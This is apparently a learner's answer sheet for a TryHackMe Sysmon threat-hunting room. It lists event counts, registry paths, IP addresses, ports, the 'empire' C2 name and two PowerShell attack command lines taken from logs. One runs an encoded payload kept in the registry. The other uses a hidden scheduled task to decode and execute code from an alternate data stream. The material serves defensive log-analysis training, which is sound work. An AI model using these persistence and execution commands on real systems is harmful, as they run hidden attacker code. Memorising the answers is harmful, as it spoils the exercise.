#Windows #Subscribers 
https://tryhackme.com/room/sysmon

```

73,591

2021-01-06 01:35:50.464 

HKLM\System\CurrentControlSet\Enum\WpdBusEnumRoot\UMB\2&37c186b&0&STORAGE#VOLUME#_??_USBSTOR#DISK&VEN_SANDISK&PROD_U3_CRUZER_MICRO&REV_8.01#4054910EF19005B3&0#\FriendlyName

\Device\HarddiskVolume3 

rundll32.exe

C:\Users\IEUser\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\S97WTYG7\update.hta

C:\Users\IEUser\Downloads\update.html

C:\Windows\System32\mshta.exe

10.0.2.18

4443

172.30.1.253 

DESKTOP-O153T4R

empirec2

HKLM\SOFTWARE\Microsoft\Network\debug

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKLM:Software\Microsoft\Network debug).debug);start -Win Hidden -A \"-enc $x\" powershell";exit; 

172.168.103.188

c:\users\q\AppData:blah.txt

"C:\WINDOWS\system32\schtasks.exe" /Create /F /SC DAILY /ST 09:00 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($(cmd /c ''more &lt; c:\users\q\AppData:blah.txt'''))))\""

lsass.exe

172.30.1.253

80

empire

```

https://motasem-notes.net/threat-hunting-with-sysmon-for-security-operations-center-tryhackme-sysmon/

![[Pasted image 20250314183506.png]]

176 points

